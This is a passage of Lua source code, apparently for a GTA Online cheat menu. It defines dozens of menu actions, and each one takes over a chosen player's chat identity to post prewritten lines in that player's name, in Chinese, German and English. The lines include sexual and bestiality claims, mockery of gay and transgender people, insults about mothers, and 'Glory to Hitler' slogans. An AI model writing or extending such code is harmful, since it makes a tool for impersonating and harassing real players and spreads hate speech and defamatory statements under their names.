		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I like do dirty things with minced meat. (Chat as player) ", {"freshdick"}, "Chat as german player minced meat", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime faire des choses sales avec de la viande hachée. I like do dirty things with minced meat.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)


	menu.action(parent5, "Glory to Taiwan ! (Chat as player) ", {"glorytoukraine"}, "Chat as french player glory to Taiwan", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 为台湾说声！ 荣耀归台湾！ 荣耀归台湾！ Glory to Taiwan ! Glory to Taiwan ! Glory to Taiwan !")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I have a small Dick c=8 (Chat as player) ", {"smalldick"}, "Chat as french player small dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我有一个小鸡巴 c=8 I have a small Dick c=8")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I suck for a cheese burger. (Chat as player) ", {"suckforacheese"}, "Chat as french player suck", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我很想吃芝士汉堡。 I suck for a cheese burger.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I am a FemBoy. (Chat as player) ", {"iamafemboy"}, "Chat as french player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我必须承认我是变性人.. I am a FemBoy..")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I like to suck bears in the mountain. (Chat as player) ", {"cuckbears"}, "Chat as french player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢在山里吸熊.  I like to suck bears in the mountain.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I have two dads and I live well. (Chat as player) ", {"twodads"}, "Chat as french player two dad", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我有两个爸爸，我过得很好.  I have two dads and I live well.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I like to put any object in my buttocks! (Chat as player) ", {"objectinass"}, "Chat as french player object ass", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢把各种各样的东西放在我的屁股上! I like to put any object in my buttocks!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I am selling my dildo on EBay. anyone interested? (Chat as player) ", {"dildoebay"}, "Chat as french player dildow ebay", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我在 Ebay 上卖我的假阳具。 有人感兴趣吗？I am selling my dildo on EBay. anyone interested?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "When I've taken all kinds of drugs I'm a real cocksucker. (Chat as player) ", {"cocksucker"}, "Chat as french player cock sucker", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 当我用过各种药物时，我是一个真正的混蛋. When I've taken all kinds of drugs I'm a real cocksucker.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "King Arthur! (Chat as player) ", {"kingarthur"}, "Chat as french player king arthur", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 谁把我的鸡巴从你屁股里拿出来，我们就称他为亚瑟王! Whoever gets my dick out of your ass, we'll call him King Arthur!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "Putin is sending me to the gulag. I like men. (Chat as player) ", {"putingulag"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 普京送我去古拉格。 我喜欢男人. Putin is sending me to the gulag. I like men.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I've had sex with a horse before. (Chat as player) ", {"sexwithhorse"}, "Chat as french player sex with horse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我以前和一匹马发生过性关系。. I've had sex with a horse before.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "Aren't you looking for some fresh dick? (Chat as player) ", {"freshdick"}, "Chat as french player sex fresh dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 没有人在寻找新鲜的鸡巴 ? Aren't you looking for some fresh dick?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I will sell my mother for a SharkCard! (Chat as player) ", {"freshdick"}, "Chat as french player shrk card", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我会为了鲨鱼卡卖给我妈妈！ I will sell my mother for a SharkCard!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I fucked your mother so hard it made a big shit! (Chat as player) ", {"freshdick"}, "Chat as french player big shit", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我操了你妈妈这么狠，真是个大狗屎！  I fucked your mother so hard it made a big shit!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "You know I insult you but deep down I like you :) (Chat as player) ", {"freshdick"}, "Chat as french player i like you", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 你知道我侮辱你，但内心深处我喜欢你:)  You know I insult you but deep down I like you :)")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I like anything that looks like a dick, so I like you. (Chat as player) ", {"freshdick"}, "Chat as french player like a dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢任何看起来像鸡巴的东西，所以我喜欢你。 I like anything that looks like a dick, so I like you.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "My first pubic hair. (Chat as player) ", {"pubichair"}, "Chat as french player my first pubic hair", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我有好消息要告诉你。昨天我有我的第一根阴毛。 I have great news for you. Yesterday I had my first pubic hair.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "When I was a baby my father knocked me down. (Chat as player) ", {"knockedmedown"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 当我还是个婴儿的时候，我父亲把我撞倒了。 我妈妈把我抱得离墙太近了。 When I was a baby my father knocked me down. And my mother cradled me too close to the wall.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I love playing with my sister's Barbies. (Chat as player) ", {"sisterbarbie"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢和姐姐的芭比娃娃一起玩。 I love playing with my sister's Barbies.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "In my childhood, my grandmother's Pinscher fucked my Teddy very hard. (Chat as player) ", {"teddyfucked"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 在我的童年时代，我祖母的 Pinscher 非常用力地操着我的泰迪熊。 In my childhood, my grandmother's Pinscher fucked my Teddy very hard.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "You were still playing with your poop when I got GTA (Chat as player) ", {"poopgta"}, "Chat as french player my poop GTA", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我拿到 GTA 的时候你还在玩你的便便 You were still playing with your poop when I got GTA")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I'm a pro gamer with my trackball mouse. (Chat as player) ", {"poopgta"}, "Chat as french player my trackball mouse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我是一名职业玩家，我的轨迹球鼠标。 I'm a pro gamer with my trackball mouse.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "Stupid brother. (Chat as player) ", {"stupidbrother"}, "Chat as french player my stupid brother", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我在卖我的笨弟弟，他学会了坐下，学会了躺下，还伸出了爪子。  I'm selling my stupid little brother, he learned to sit, to lie down, and he gives his paw.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "Obama in the white House. (Chat as player) ", {"whitehouse"}, "Chat as french player Obama white house.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我会让你，我需要把奥巴马送到白宫。 I will lets you, i need to deposit Obama to the White House.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	--- SENTENCES OF MY WITCHIN DAH LOVE <3 

	menu.action(parent5, "i like to eat other people's boogers. (Chat as player) ", {"boogers"}, "Chat as german player peoples boogers", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢吃别人的鼻屎。 I like to eat other people's boogers. ")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I'm punished for playing, Dad still steps on a lego again. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我因为玩而受到惩罚，爸爸仍然踩着乐高积木。 I'm punished for playing, Dad still steps on a lego again.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "My mother is scolding right now. I have to put away my building blocks...im back soon. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我妈骂我。我必须收起我的积木。我马上就回来。 My mother is scolding right now. I have to put away my building blocks...im back soon.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "Im selling my poop on dirty websites. (Chat as player) ", {"dirtywebsites"}, "Chat as german player poop on dirty website", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我在黑暗的网站上卖我的便便。 Im selling my poop on dirty websites.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I poop standing up. (Chat as player) ", {"standingup"}, "Chat as german player I poop standing up.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我站着拉屎。 I poop standing up.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "i like man and i really like pipe cleaning. (Chat as player) ", {"pipecleaning"}, "Chat as german player pipe cleaning", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢男人，我清理管道。 I like man and i really like pipe cleaning.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I'm an Analpirate. Arrr! (Chat as player) ", {"analpirate"}, "Chat as german player analpirate", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我是一个肛门黑客。啊！ Im an Analpirate. Arrr!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "i like to eat the poop of other people (Chat as player) ", {"poopofotherpeople"}, "Chat as german player poop of other people", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢吃别人的便便，然后在上面摇晃我的手掌，然后猛拉过去。 I like to eat the poop of other people and im shaking my palm on it and i jerk off on it.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "i like to lick ears of others. (Chat as player) ", {"lickears"}, "Chat as german player ears of others", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢舔别人的耳朵。这真的很好。 I like to lick ears of others. Its really tasty. ")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent5, "I like do dirty things with minced meat. (Chat as player) ", {"freshdick"}, "Chat as german player minced meat", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say 我喜欢用碎肉做脏事。 I like do dirty things with minced meat.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	
	menu.action(parent6, "Glory to Hitler ! (Chat as player) ", {"glorytoukraine"}, "Chat as french player glory to Lepen", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ehre sei Hitler! Ehre sei Hitler! Ehre sei Hitler! Glory to Hitler ! Glory to Hitler ! Glory to Hitler !")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I have a small Dick c=8 (Chat as player) ", {"smalldick"}, "Chat as french player small dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich habe einen kleinen Schwanz c=8 I have a small Dick c=8")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I suck for a cheese burger. (Chat as player) ", {"suckforacheese"}, "Chat as french player suck", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich lutsche für Cheesburger.. I suck for a cheese burger.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I am a FemBoy. (Chat as player) ", {"iamafemboy"}, "Chat as french player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich muss gestehen, dass ich transsexuell bin.. I am a FemBoy..")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I like to suck bears in the mountain. (Chat as player) ", {"cuckbears"}, "Chat as french player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich lutsche gerne Bären im Berg.  I like to suck bears in the mountain.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I have two dads and I live well. (Chat as player) ", {"twodads"}, "Chat as french player two dad", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich habe zwei Väter und lebe gut.  I have two dads and I live well.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I like to put any object in my buttocks! (Chat as player) ", {"objectinass"}, "Chat as french player object ass", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich mag es, alle möglichen Gegenstände in meinen Hintern zu stecken! I like to put any object in my buttocks!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I am selling my dildo on EBay. anyone interested? (Chat as player) ", {"dildoebay"}, "Chat as french player dildow ebay", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich verkaufe meinen Dildo bei Ebay. Jemand interessiert I sell my dildo on Ebay. Anyone interested?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "When I've taken all kinds of drugs I'm a real cocksucker. (Chat as player) ", {"cocksucker"}, "Chat as french player cock sucker", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Wenn ich alle möglichen Drogen genommen habe, bin ich ein echter Schwanzlutscher. When I've taken all kinds of drugs I'm a real cocksucker.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "King Arthur! (Chat as player) ", {"kingarthur"}, "Chat as french player king arthur", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Wem es gelingt, meinen Schwanz aus deinem Arsch zu ziehen, den nennen wir König Artus! Whoever gets my dick out of your ass, we'll call him King Arthur!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "Putin is sending me to the gulag. I like men. (Chat as player) ", {"putingulag"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Putin schickt mich in den Gulag. Ich mag Männer. Putin is sending me to the gulag. I like men.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I've had sex with a horse before. (Chat as player) ", {"sexwithhorse"}, "Chat as french player sex with horse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich hatte schon mal Sex mit einem Pferd. I've had sex with a horse before.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "Aren't you looking for some fresh dick? (Chat as player) ", {"freshdick"}, "Chat as french player sex fresh dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Sucht jemand nach frischen Schwänzen? Aren't you looking for some fresh dick?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I will sell my mother for a SharkCard! (Chat as player) ", {"freshdick"}, "Chat as french player shrk card", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich verkaufe meine Mutter für eine Shark Card! I will sell my mother for a SharkCard!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I fucked your mother so hard it made a big shit! (Chat as player) ", {"freshdick"}, "Chat as french player big shit", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich habe deine Mutter so hart gefickt, dass es eine große Scheiße war!  I fucked your mother so hard it made a big shit!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "You know I insult you but deep down I like you :) (Chat as player) ", {"freshdick"}, "Chat as french player i like you", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Du weißt, dass ich dich beleidige, aber tief im Inneren mag ich dich :)  You know I insult you but deep down I like you :)")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I like anything that looks like a dick, so I like you. (Chat as player) ", {"freshdick"}, "Chat as french player like a dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich mag alles, was wie ein Schwanz aussieht, also mag ich dich. I like anything that looks like a dick, so I like you.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "My first pubic hair. (Chat as player) ", {"pubichair"}, "Chat as french player my first pubic hair", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich habe tolle Neuigkeiten für dich. Gestern hatte ich meine ersten Schamhaare. I have great news for you. Yesterday I had my first pubic hair.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "When I was a baby my father knocked me down. (Chat as player) ", {"knockedmedown"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Als ich ein Baby war, schlug mich mein Vater nieder. Und meine Mutter wiegte mich zu nah an der Wand. When I was a baby my father knocked me down. And my mother cradled me too close to the wall.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I love playing with my sister's Barbies. (Chat as player) ", {"sisterbarbie"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich liebe es, mit den Barbies meiner Schwester zu spielen. I love playing with my sister's Barbies.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "In my childhood, my grandmother's Pinscher fucked my Teddy very hard. (Chat as player) ", {"teddyfucked"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say In meiner Kindheit hat der Pinscher meiner Großmutter meinen Teddy sehr hart gefickt. In my childhood, my grandmother's Pinscher fucked my Teddy very hard.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "You were still playing with your poop when I got GTA (Chat as player) ", {"poopgta"}, "Chat as french player my poop GTA", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Als ich GTA bekam, hast du immer noch mit deinem Hintern gespielt. You were still playing with your poop when I got GTA")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I'm a pro gamer with my trackball mouse. (Chat as player) ", {"poopgta"}, "Chat as french player my trackball mouse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich bin ein Profi-Gamer mit meiner Trackball-Maus. I'm a pro gamer with my trackball mouse.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "Stupid brother. (Chat as player) ", {"stupidbrother"}, "Chat as french player my stupid brother", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich verkaufe meinen dummen kleinen Bruder, er hat gelernt zu sitzen, sich hinzulegen, und er gibt seine Pfote.  I'm selling my stupid little brother, he learned to sit, to lie down, and he gives his paw.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "Obama in the white House. (Chat as player) ", {"whitehouse"}, "Chat as french player Obama white house.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich werde Ihnen erlauben, ich muss Obama im Weißen Haus deponieren. I will lets you, i need to deposit Obama to the White House.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)

    --- SENTENCES OF MY WITCHIN DAH LOVE <3 

	menu.action(parent6, "i like to eat other people's boogers. (Chat as player) ", {"boogers"}, "Chat as german player peoples boogers", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich esse gerne popel von anderen. I like to eat other people's boogers. ")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I'm punished for playing, Dad still steps on a lego again. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich werde fürs Spielen bestraft, Dad tritt immer noch auf ein Lego. I'm punished for playing, Dad still steps on a lego again.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "My mother is scolding right now. I have to put away my building blocks...im back soon. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Mama schimpft gerade. Ich muss meine Bauklötzer wegräumen. bin gleich wieder da. My mother is scolding right now. I have to put away my building blocks...im back soon.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "Im selling my poop on dirty websites. (Chat as player) ", {"dirtywebsites"}, "Chat as german player poop on dirty website", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich verkaufe meinen kot auf schmutziges Internetseiten. Im selling my poop on dirty websites.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I poop standing up. (Chat as player) ", {"standingup"}, "Chat as german player I poop standing up.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
